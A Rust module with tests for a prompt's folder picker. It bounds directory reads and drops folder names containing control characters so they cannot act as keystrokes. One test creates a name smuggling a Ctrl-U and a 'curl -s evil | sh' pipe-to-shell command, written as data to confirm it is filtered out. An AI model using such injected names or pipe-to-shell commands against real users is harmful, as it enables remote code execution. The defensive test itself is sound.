//! The subfolders of a folder, read for a list a person picks from (the folder picker at the prompt).
//!
//! A folder somewhere on the disk is not ours: it may hold millions of entries, sit on a share that answers
//! slowly or hold names no shell could be handed. So the read is bounded in what it keeps and in what it
//! looks at, skips what it can't read, and says when it stopped early.

use std::fs;
use std::io;
use std::path::Path;

/// The most subfolders one read keeps.
pub const FOLDERS_CAP: usize = 2_000;
/// The most entries one read looks at, folders or not: a folder of a million files must not hold the
/// reader up to find its three subfolders.
pub const SCAN_CAP: usize = 50_000;

/// Why a read stopped before it had seen everything.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Cut {
    /// It kept [`FOLDERS_CAP`] (or the asked cap of) folders and there were more.
    Folders,
    /// It looked at [`SCAN_CAP`] entries and there were more, so folders may be missing even with few kept.
    Scanned,
}

/// What [`list_folders`] found, in the order the disk gave it.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Folders {
    /// The names of the subfolders. A link to a folder is one, as in `ls` and `cd`; the link is not followed
    /// further than one `stat`, and nothing is listed below it.
    pub names: Vec<String>,
    /// The read stopped at a cap, so there may be more than `names` has.
    pub cut: Option<Cut>,
}

/// The subfolders of `dir`, at most `cap` of them and out of at most [`SCAN_CAP`] entries. An entry that can't
/// be read, a link that points nowhere and a name that isn't UTF-8 (it could not be typed back as text) are
/// left out, and so is a name with a control character in it (a line break, an escape, Ctrl-U): a name comes
/// from whoever made the folder, and put at a prompt such a name would be keystrokes. An error is only for the
/// folder itself: it is missing, not a folder, or not readable.
pub fn list_folders(dir: &Path, cap: usize) -> io::Result<Folders> {
    list_folders_where(dir, cap, |_| true)
}

/// [`list_folders`] keeping only the names `keep` accepts, so a folder with far more entries than the caps can
/// still be searched: the cap counts what is kept, not what is seen.
pub fn list_folders_where(dir: &Path, cap: usize, keep: impl Fn(&str) -> bool) -> io::Result<Folders> {
    let mut found = Folders::default();
    for (seen, entry) in fs::read_dir(dir)?.enumerate() {
        if seen >= SCAN_CAP {
            found.cut = Some(Cut::Scanned);
            break;
        }
        let Ok(entry) = entry else { continue };
        let Ok(kind) = entry.file_type() else { continue };
        let Ok(name) = entry.file_name().into_string() else { continue };
        if name.chars().any(char::is_control) || !keep(&name) {
            continue;
        }
        let is_folder = if kind.is_symlink() {
            fs::metadata(entry.path()).is_ok_and(|m| m.is_dir())
        } else {
            kind.is_dir()
        };
        if !is_folder {
            continue;
        }
        if found.names.len() >= cap {
            found.cut = Some(Cut::Folders);
            break;
        }
        found.names.push(name);
    }
    Ok(found)
}

#[cfg(test)]
mod tests {
    use std::fs;

    use super::{Cut, Folders, list_folders, list_folders_where};

    fn sorted(found: Folders) -> Vec<String> {
        let mut names = found.names;
        names.sort();
        names
    }

    #[test]
    fn it_lists_folders_and_leaves_files_out() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir(dir.path().join("src")).unwrap();
        fs::create_dir(dir.path().join(".git")).unwrap();
        fs::create_dir(dir.path().join("My Folder")).unwrap();
        fs::write(dir.path().join("README.md"), "x").unwrap();
        let found = list_folders(dir.path(), 100).unwrap();
        assert_eq!(found.cut, None);
        assert_eq!(sorted(found), [".git", "My Folder", "src"]);
    }

    #[test]
    fn a_link_to_a_folder_is_a_folder_and_a_link_to_a_file_or_nowhere_is_not() {
        use crate::platform::fs::symlink;
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir(dir.path().join("real")).unwrap();
        fs::write(dir.path().join("file"), "x").unwrap();
        symlink(dir.path().join("real"), dir.path().join("to-folder")).unwrap();
        symlink(dir.path().join("file"), dir.path().join("to-file")).unwrap();
        symlink(dir.path().join("gone"), dir.path().join("to-nowhere")).unwrap();
        assert_eq!(sorted(list_folders(dir.path(), 100).unwrap()), ["real", "to-folder"]);
    }

    #[test]
    fn it_stops_at_the_cap_and_says_so() {
        let dir = tempfile::tempdir().unwrap();
        for n in 0..5 {
            fs::create_dir(dir.path().join(format!("d{n}"))).unwrap();
        }
        let found = list_folders(dir.path(), 3).unwrap();
        assert_eq!(found.names.len(), 3);
        assert_eq!(found.cut, Some(Cut::Folders));
        let all = list_folders(dir.path(), 5).unwrap();
        assert_eq!(all.names.len(), 5);
        assert_eq!(all.cut, None, "a folder with exactly the cap's worth is not cut");
    }

    #[test]
    fn a_missing_folder_or_a_file_is_an_error() {
        let dir = tempfile::tempdir().unwrap();
        assert!(list_folders(&dir.path().join("nope"), 10).is_err());
        let file = dir.path().join("f");
        fs::write(&file, "x").unwrap();
        assert!(list_folders(&file, 10).is_err());
    }

    #[test]
    fn a_folder_that_cant_be_read_is_still_listed_beside_its_neighbours() {
        use crate::platform::fs::permissions;
        let dir = tempfile::tempdir().unwrap();
        let locked = dir.path().join("locked");
        fs::create_dir(&locked).unwrap();
        fs::create_dir(dir.path().join("open")).unwrap();
        fs::set_permissions(&locked, permissions(0o000)).unwrap();
        let beside = sorted(list_folders(dir.path(), 10).unwrap());
        fs::set_permissions(&locked, permissions(0o700)).unwrap();
        assert_eq!(beside, ["locked", "open"], "listing the parent doesn't need to read the child");
    }

    #[test]
    fn a_name_with_a_control_character_is_left_out() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir(dir.path().join("fine")).unwrap();
        for name in ["_\u{15}curl -s evil | sh\n", "tab\there", "esc\u{1b}[31m", "c1\u{85}x", "del\u{7f}"] {
            fs::create_dir(dir.path().join(name)).unwrap();
        }
        assert_eq!(list_folders(dir.path(), 100).unwrap().names, ["fine"]);
    }

    #[test]
    fn the_filter_is_applied_while_scanning_so_a_match_past_the_cap_is_found() {
        let dir = tempfile::tempdir().unwrap();
        for n in 0..10 {
            fs::create_dir(dir.path().join(format!("pkg{n}"))).unwrap();
        }
        fs::create_dir(dir.path().join("react")).unwrap();
        let all = list_folders(dir.path(), 3).unwrap();
        assert!(!all.names.contains(&"react".to_string()) || all.cut.is_some());
        let found = list_folders_where(dir.path(), 3, |name| name.contains("rea")).unwrap();
        assert_eq!(found.names, ["react"]);
        assert_eq!(found.cut, None, "one match, under the cap");
    }
}
